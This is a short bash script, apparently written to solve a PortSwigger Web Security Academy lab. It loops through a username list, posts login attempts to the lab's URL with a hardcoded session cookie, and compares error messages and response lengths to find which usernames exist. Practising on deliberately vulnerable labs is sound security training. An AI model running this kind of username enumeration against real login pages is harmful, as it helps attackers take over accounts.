#!/bin/bash

echo "Checking for subtle differences in error messages..."
echo "=================================================="
echo ""

# Check each username for the exact error message
while IFS= read -r user; do
    response=$(curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test")
    
    # Extract the error message paragraph
    error_msg=$(echo "$response" | grep -o '<p class=is-warning>.*</p>' | sed 's/<[^>]*>//g')
    
    # Count total length after removing analytics ID
    cleaned_response=$(echo "$response" | sed 's/analytics?id=[0-9]*/analytics?id=PLACEHOLDER/g')
    length=${#cleaned_response}
    
    printf "%-20s | %-40s | Length: %d\n" "$user" "$error_msg" "$length"
done < usernames.txt | head -30